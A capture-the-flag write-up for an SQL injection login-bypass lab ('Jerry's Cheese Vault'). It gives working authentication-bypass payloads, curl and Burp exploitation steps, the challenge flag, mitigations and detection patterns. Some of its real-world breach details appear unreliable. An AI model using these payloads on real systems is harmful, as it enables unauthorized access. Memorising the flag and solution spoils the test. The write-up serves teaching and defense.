# Jerry's Cheese Vault - Technical Writeup

**Author:** Bhargav Raj Dutta  
**Date:** October 21, 2025  
**Challenge:** Jerry's Cheese Vault  
**Difficulty:** Easy to Medium  
**Category:** Web Security - SQL Injection  
**Flag:** `Exploit3rs{cheese_vault_sql_inject_2025}`

---

## Table of Contents
1. [Executive Summary](#executive-summary)
2. [Challenge Overview](#challenge-overview)
3. [Reconnaissance](#reconnaissance)
4. [Vulnerability Analysis](#vulnerability-analysis)
5. [Exploitation](#exploitation)
6. [Flag Retrieval](#flag-retrieval)
7. [Mitigation Strategies](#mitigation-strategies)
8. [Detection Methods](#detection-methods)
9. [Common Pitfalls](#common-pitfalls)
10. [Real-World Impact](#real-world-impact)

---

## Executive Summary

This CTF challenge demonstrates a **SQL injection vulnerability** in a web application's authentication system. The vulnerability exists due to unsafe string concatenation in SQL queries, allowing attackers to bypass authentication and gain unauthorized administrative access. Players must exploit this flaw to retrieve a hidden flag from admin-only notes.

**Vulnerability Type:** SQL Injection (CWE-89)  
**OWASP Category:** A03:2021 – Injection  
**Severity:** Critical (CVSS 9.8)  
**Attack Complexity:** Low  
**Required Privileges:** None  

---

## Challenge Overview

### Storyline

**Setting:** Tom & Jerry Universe  
**Protagonist:** Nibbles (Jerry's nephew)  
**Antagonist:** Tom the Cat  
**Mission:** Break into the cheese vault system to free Jerry

### Scenario Context

Tom has captured Jerry and secured his cheese collection in a digital vault system. The vault management interface was quickly developed by Tom's human owner and contains a critical authentication vulnerability. As Nibbles, players must exploit this security flaw to:

1. Bypass the login system
2. Access admin-level features
3. Read confidential admin notes
4. Discover the location of the master key to Jerry's cage
5. Retrieve the CTF flag

### Technical Environment

**Web Stack:**
- Backend: Flask (Python 3.11)
- Database: PostgreSQL 15
- Deployment: Docker Compose

**Components:**
- Login system with authentication
- Cheese inventory management
- Admin-only notes section (contains flag)
- Session management

**Credentials Provided:**
- Regular users: `jerry/cheeselover`, `tom/meowmeow123`
- Admin credentials intentionally not disclosed

---

## Reconnaissance

### Phase 1: Information Gathering

**Step 1.1 - Access the Application**
```bash
# Navigate to challenge
open http://localhost:8080
```

**Observations:**
- Landing page explains the scenario
- Tom & Jerry themed interface
- Clear call-to-action: "Access Vault System"
- Hints about security vulnerabilities

**Step 1.2 - Examine Login Page**
```
URL: http://localhost:8080/login
```

**Key Findings:**
- Standard username/password form
- POST method to `/login` endpoint
- No visible CSRF protection
- Test credentials provided (jerry/cheeselover, tom/meowmeow123)
- Mention of "admin" role with special privileges

**Step 1.3 - Test Normal Authentication**

Test with provided credentials:
```
Username: jerry
Password: cheeselover
```

**Result:**
- ✅ Login successful
- Redirected to `/vault`
- Can view cheese inventory
- ❌ Cannot see "Admin Notes" section
- Message: "Admin notes require admin role"

**Conclusion:** Admin access is required to view sensitive information.

---

## Vulnerability Analysis

### Code Review

**Vulnerable Endpoint:** `/login` (POST)

**Source Code Analysis:**
```python
@app.route("/login", methods=["GET","POST"])
def login():
    u = request.form.get("username","")
    p = request.form.get("password","")
    conn = get_conn_with_retry(DATABASE_URL)
    cur = conn.cursor(cursor_factory=psycopg2.extras.RealDictCursor)

    # VULNERABILITY: Direct string concatenation in SQL query
    query = f"SELECT username, role FROM users WHERE username = '{u}' AND password = '{p}'"
    cur.execute(query)
    row = cur.fetchone()
```

### Security Flaw Identification

**Problem:** Unsafe use of Python f-strings to construct SQL query

**Issues:**
1. ❌ **No input sanitization** - User input directly embedded in query
2. ❌ **String concatenation** - f-string formatting instead of parameterized queries
3. ❌ **No prepared statements** - SQL parser treats input as code
4. ❌ **Both fields vulnerable** - Username and password fields exploitable

**Attack Vector:**
- **Entry Point:** Username field (or password field)
- **Attack Type:** Classic SQL Injection
- **Technique:** Comment-based authentication bypass
- **Goal:** Make WHERE clause always true

### SQL Query Breakdown

**Intended Behavior:**
```sql
-- Normal query with safe inputs
SELECT username, role FROM users 
WHERE username = 'jerry' AND password = 'cheeselover'

-- Returns: { username: 'jerry', role: 'user' }
```

**Exploited Behavior:**
```sql
-- Malicious input: username = "admin' OR '1'='1' --"
SELECT username, role FROM users 
WHERE username = 'admin' OR '1'='1' --' AND password = 'anything'

-- Breaks down to:
-- 1. username = 'admin' (checks if admin exists)
-- 2. OR '1'='1' (always TRUE)
-- 3. -- (SQL comment, ignores rest of query)
-- 4. Password check never evaluated

-- Returns: First row in users table (usually admin)
```

### Why This Works

**SQL Parser Interpretation:**

1. **String Closure:** `'admin'` closes the username string
2. **Logical Operator:** `OR` introduces alternative condition
3. **Always True:** `'1'='1'` is a tautology (always evaluates to true)
4. **Comment Injection:** `--` comments out the password requirement
5. **Result:** Query returns first matching user (admin)

---

## Exploitation

### Method 1: Manual Browser Exploitation

**Step-by-Step Instructions:**

**Step 1:** Navigate to login page
```
http://localhost:8080/login
```

**Step 2:** Enter malicious payload

**Field:** Username  
**Value:** `admin' OR '1'='1' --`

**Field:** Password  
**Value:** `anything` (any value works)

**Step 3:** Submit form

**Step 4:** Observe results
- ✅ Authentication bypassed
- ✅ Logged in as admin user
- ✅ Redirected to `/vault`
- ✅ "Admin Notes" section visible

**Step 5:** Retrieve flag

Scroll to "Admin Notes" section and find:

```
Title: Master Key Location
Content: The master key to Jerry's cage is hidden behind the 
         portrait in the living room. 
         Flag: Exploit3rs{cheese_vault_sql_inject_2025}
```

**Flag Found:** `Exploit3rs{cheese_vault_sql_inject_2025}`

---

### Method 2: Automated Exploitation (Golden Solution)

**Prerequisites:**
```bash
cd golden_solution
pip3 install -r requirements.txt
```

**Execute Exploit:**
```bash
python3 solve.py http://localhost:8080
```

**Script Workflow:**

1. **Health Check** - Verify target is reachable
2. **Payload Injection** - Send SQL injection via POST
3. **Session Capture** - Maintain authenticated session
4. **Vault Access** - Request admin page
5. **Flag Extraction** - Parse HTML for flag pattern
6. **Report** - Display captured flag

**Expected Output:**
```
=== Golden Solution: Jerry's Cheese Vault ===
[*] Health: 200 ok
[>] SQLi login with username="admin' OR '1'='1' -- "
[*] POST /login => 200
[*] GET /vault => 200

[+] FLAG FOUND: Exploit3rs{cheese_vault_sql_inject_2025}
```

---

### Method 3: Command-Line Exploitation (curl)

**One-Liner Exploit:**
```bash
# Send injection payload
curl -c cookies.txt -b cookies.txt \
  -d "username=admin' OR '1'='1' --&password=test" \
  -L http://localhost:8080/login

# Retrieve vault page with flag
curl -b cookies.txt http://localhost:8080/vault | grep -o "Exploit3rs{[^}]*}"
```

**Output:**
```
Exploit3rs{cheese_vault_sql_inject_2025}
```

---

### Method 4: Burp Suite Exploitation

**Step 1:** Configure browser proxy (127.0.0.1:8080)

**Step 2:** Intercept login request

**Step 3:** Modify POST parameters:
```
username=admin'+OR+'1'%3D'1'+--&password=test
```

**Step 4:** Forward request

**Step 5:** Observe response - Admin session established

---

## Alternative Payloads

### Payload Variations

All of these work for this challenge:

**Payload 1 (Used in writeup):**
```
admin' OR '1'='1' --
```

**Payload 2 (Simpler):**
```
' OR 1=1 --
```

**Payload 3 (Admin-specific):**
```
admin'--
```

**Payload 4 (Alternative syntax):**
```
' OR 'a'='a' --
```

**Payload 5 (Union-based, for exploration):**
```
' UNION SELECT 'admin', 'admin' --
```

### Payload Comparison

| Payload | Complexity | Stealth | Success Rate |
|---------|-----------|---------|--------------|
| `admin' OR '1'='1' --` | Low | Low | 100% |
| `' OR 1=1 --` | Very Low | Very Low | 100% |
| `admin'--` | Very Low | Medium | 100% |
| `' OR 'a'='a' --` | Low | Low | 100% |

---

## Flag Retrieval

### Location
- **Table:** `admin_notes`
- **Column:** `content`
- **Row:** `title = 'Master Key Location'`

### Database Query (for reference)
```sql
SELECT * FROM admin_notes WHERE title = 'Master Key Location';
```

### Web UI Location
- **Page:** `/vault`
- **Section:** "Admin Notes" (green background)
- **Card:** Third note card
- **Title:** "Master Key Location"

### Flag Format
```
Exploit3rs{cheese_vault_sql_inject_2025}
```

**Components:**
- Prefix: `Exploit3rs{`
- Identifier: `cheese_vault_sql_inject_2025`
- Suffix: `}`

---

## Mitigation Strategies

### 1. Use Parameterized Queries (PRIMARY FIX)

**Current Vulnerable Code:**
```python
query = f"SELECT username, role FROM users WHERE username = '{u}' AND password = '{p}'"
cur.execute(query)
```

**Secure Implementation:**
```python
query = "SELECT username, role FROM users WHERE username = %s AND password = %s"
cur.execute(query, (u, p))
```

**Why This Works:**
- Database driver treats parameters as **data**, not code
- Special characters automatically escaped
- SQL structure cannot be modified
- Industry standard best practice

---

### 2. Input Validation & Sanitization

**Whitelist Approach:**
```python
import re

def validate_username(username):
    # Only allow alphanumeric and underscore
    if not re.match(r'^[a-zA-Z0-9_]{3,20}$', username):
        raise ValueError("Invalid username format")
    return username

# In login function
u = validate_username(request.form.get("username", ""))
```

**Blacklist Approach (Less Secure):**
```python
def sanitize_input(user_input):
    dangerous_chars = ["'", '"', ";", "--", "/*", "*/", "xp_", "sp_"]
    for char in dangerous_chars:
        if char in user_input:
            raise ValueError("Invalid characters detected")
    return user_input
```

**Note:** Whitelist approach is preferred over blacklist.

---

### 3. Use ORM (Object-Relational Mapping)

**SQLAlchemy Example:**
```python
from flask_sqlalchemy import SQLAlchemy

db = SQLAlchemy(app)

class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(50), unique=True)
    password = db.Column(db.String(100))
    role = db.Column(db.String(20))

# In login function
user = User.query.filter_by(username=u, password=p).first()
```

**Benefits:**
- Automatic query parameterization
- Reduced SQL injection risk
- Cleaner code structure
- Built-in validation

---

### 4. Implement Prepared Statements

**psycopg2 Named Parameters:**
```python
query = """
    SELECT username, role FROM users 
    WHERE username = %(username)s AND password = %(password)s
"""
cur.execute(query, {'username': u, 'password': p})
```

---

### 5. Apply Principle of Least Privilege

**Database User Permissions:**
```sql
-- Create restricted user
CREATE USER app_user WITH PASSWORD 'secure_password';

-- Grant only necessary permissions
GRANT SELECT ON users TO app_user;
GRANT SELECT ON cheese_inventory TO app_user;
GRANT SELECT ON admin_notes TO app_user;

-- Revoke dangerous permissions
REVOKE CREATE, DROP, ALTER ON ALL TABLES FROM app_user;
```

---

### 6. Additional Security Layers

**A. Web Application Firewall (WAF)**
- ModSecurity rules to detect SQL injection
- Cloud WAF (Cloudflare, AWS WAF)

**B. Rate Limiting**
```python
from flask_limiter import Limiter

limiter = Limiter(app, key_func=lambda: request.remote_addr)

@app.route("/login", methods=["POST"])
@limiter.limit("5 per minute")
def login():
    # Login logic
```

**C. Account Lockout**
- Lock account after 5 failed attempts
- Temporary lockout (15 minutes)

**D. Multi-Factor Authentication (MFA)**
- Additional layer beyond password
- Reduces impact of credential compromise

**E. Security Headers**
```python
@app.after_request
def set_security_headers(response):
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    return response
```

---

## Detection Methods

### Application-Level Detection

**Log Monitoring:**
```python
import logging

logger = logging.getLogger(__name__)

def login():
    u = request.form.get("username", "")
    
    # Log suspicious patterns
    if any(char in u for char in ["'", "--", ";", "/*"]):
        logger.warning(f"Suspicious login attempt: {request.remote_addr} - username contains SQL characters")
    
    # Log all login attempts
    logger.info(f"Login attempt: user={u}, ip={request.remote_addr}")
```

**Suspicious Patterns:**
- SQL keywords: `OR`, `AND`, `UNION`, `SELECT`, `DROP`
- Comment sequences: `--`, `/*`, `*/`, `#`
- Quote characters: `'`, `"`
- Multiple failed login attempts

---

### Database-Level Detection

**Query Logging:**
```sql
-- Enable query logging in PostgreSQL
ALTER SYSTEM SET log_statement = 'all';
SELECT pg_reload_conf();
```

**Anomaly Detection:**
- Queries with always-true conditions (`1=1`, `'a'='a'`)
- Queries with comment syntax
- Unusual query patterns

---

### Network-Level Detection

**IDS/IPS Signatures:**
- Snort/Suricata rules for SQL injection
- Pattern matching for common payloads

**Example Snort Rule:**
```
alert tcp any any -> any 80 (
    msg:"SQL Injection Attempt - OR 1=1";
    content:"OR"; nocase;
    content:"1=1"; nocase;
    sid:1000001;
)
```

---

## Common Pitfalls

### For Players

**Mistake 1: Incorrect Quote Handling**
❌ Wrong: `admin OR 1=1 --`  
✅ Correct: `admin' OR '1'='1' --`

**Explanation:** Must close the existing string with `'` before injecting SQL.

---

**Mistake 2: Forgetting SQL Comments**
❌ Wrong: `admin' OR '1'='1'`  
✅ Correct: `admin' OR '1'='1' --`

**Explanation:** Without `--`, the password check is still evaluated and will fail.

---

**Mistake 3: Space After Comment**
⚠️ Sometimes matters: `--` vs `-- `

**Explanation:** Some SQL parsers require a space after `--`. Both work in PostgreSQL.

---

**Mistake 4: URL Encoding Issues**
If using Burp/curl, remember:
- Space: `%20` or `+`
- Single quote: `%27`
- Double dash: `--` (usually doesn't need encoding)

---

**Mistake 5: Case Sensitivity**
SQL keywords are case-insensitive:
- `OR` = `or` = `Or`
- `AND` = `and` = `And`

All work equally.

---

### For Defenders

**Pitfall 1: Blacklist Validation**
Blacklists are bypassable:
- `' OR '1'='1' --` (standard)
- `' || '1'='1' --` (alternative OR)
- `' OR 1 --` (without quotes)

**Solution:** Use whitelist validation + parameterized queries.

---

**Pitfall 2: Escaping Only Single Quotes**
```python
# INSECURE
u = u.replace("'", "''")  # Doubles single quotes
```

**Problem:** Can still be bypassed with other techniques.

**Solution:** Use parameterized queries, not manual escaping.

---

**Pitfall 3: Client-Side Validation Only**
JavaScript validation can be bypassed easily.

**Solution:** Always validate on server-side.

---

## Real-World Impact

### Famous SQL Injection Incidents

**1. Heartland Payment Systems (2008)**
- **Impact:** 130 million credit card numbers stolen
- **Cost:** $140 million in fines and settlements
- **Method:** SQL injection in payment processing application
- **Outcome:** Bankruptcy, acquired by another company

**2. Sony Pictures (2011)**
- **Impact:** 1 million user accounts compromised
- **Data Stolen:** Names, emails, passwords, dates of birth
- **Method:** SQL injection in multiple web applications
- **Outcome:** Major PR disaster, lawsuits

**3. TalkTalk (2015)**
- **Impact:** 157,000 customer records stolen
- **Cost:** £77 million in damages
- **Method:** SQL injection in legacy web page
- **Outcome:** Record fine from UK regulators

**4. 7-Eleven (2019)**
- **Impact:** Point-of-sale systems compromised
- **Method:** SQL injection in franchise management system
- **Outcome:** Nationwide security audit required

---

### OWASP Top 10 Rankings

**Historical Trend:**
- **2013:** #1 Injection
- **2017:** #1 Injection
- **2021:** #3 Injection (combined category)

**Why Still Prevalent:**
- Legacy code
- Lack of security training
- Framework misuse
- Time pressure in development

---

### Business Impact

**Direct Costs:**
- Data breach fines (GDPR: up to €20M or 4% revenue)
- Legal fees and settlements
- Forensic investigation
- System remediation

**Indirect Costs:**
- Reputation damage
- Customer churn
- Stock price impact
- Lost business opportunities

**Example:** Average cost of a data breach in 2024: $4.45 million (IBM Study)

---

## Testing Notes

### Challenge Difficulty Assessment

**Target Audience:** Beginners to intermediate

**Estimated Solve Time:** 15-30 minutes

**Difficulty Factors:**
- ✅ Clear hints provided
- ✅ Test credentials given
- ✅ Obvious vulnerability location
- ✅ Standard SQL injection technique

**Skills Required:**
- Basic SQL knowledge
- Understanding of web authentication
- Ability to use browser developer tools
- Python basics (for golden solution)

---

### Deployment Testing

**Tested On:**
- MacBook Air M1 (2020)
- macOS Sonoma
- Docker Desktop 4.x
- Python 3.11

**Resource Usage:**
- Web container: ~50MB RAM
- DB container: ~30MB RAM
- Total: <100MB RAM
- Build time: ~2 minutes
- Startup time: ~10 seconds

---

## Conclusion

This challenge successfully demonstrates:

1. ✅ **SQL Injection Fundamentals** - Clear example of string concatenation vulnerability
2. ✅ **Authentication Bypass** - Practical exploitation of login systems
3. ✅ **Real-World Relevance** - OWASP Top 10 vulnerability
4. ✅ **Mitigation Education** - Multiple defense strategies explained

**Key Takeaways:**
- Never trust user input
- Always use parameterized queries
- Input validation is not enough alone
- Defense in depth approach
- Regular security audits

**Remember:** SQL injection is 100% preventable with proper coding practices!

---

## References

1. OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection
2. CWE-89: https://cwe.mitre.org/data/definitions/89.html
3. PostgreSQL Security: https://www.postgresql.org/docs/15/sql-prepare.html
4. Flask Security: https://flask.palletsprojects.com/en/latest/security/
5. Python DB-API 2.0: https://peps.python.org/pep-0249/

---

**Document Version:** 1.0  
**Author:** Bhargav Raj Dutta  
**Date:** October 21, 2025  
**Challenge:** Jerry's Cheese Vault  
**For:** Exploit3rs CTF Evaluation
